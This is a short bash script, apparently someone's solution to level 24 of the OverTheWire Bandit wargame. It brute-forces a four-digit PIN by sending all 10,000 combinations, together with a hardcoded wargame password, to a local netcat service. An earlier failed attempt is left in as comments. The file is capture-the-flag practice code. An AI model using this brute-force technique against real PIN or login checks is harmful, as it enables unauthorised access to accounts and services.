#!/bin/bash
#a code to brute force the pincode for bandit24 on Over The Wire Bandit wargame.

#touch results.txt
#for i in $(seq -f "%04g" 0 9999);do
#        echo trying pin : $i
#        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | timeout 0.7 netcat  localhos$
#        echo $i >> results.txt
#        cat results.txt
#        cat results.txt | grep -q "Wrong"
#        if [ $? ];then
#                echo pin $i is wrong
#        else
#                echo found the correct pin : $i
#                break
#                exit
#
#        fi
#done
#
#First code doesnt exactly work.
#It seems as the program chooses a new pincode each time it get's pinged.

#this is much simpler and it works. it's not very verbose though.
for i in $(seq -f "%04g" 0000 9999);do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> combinations.txt
done
netcat localhost 30002 < combinations.txt

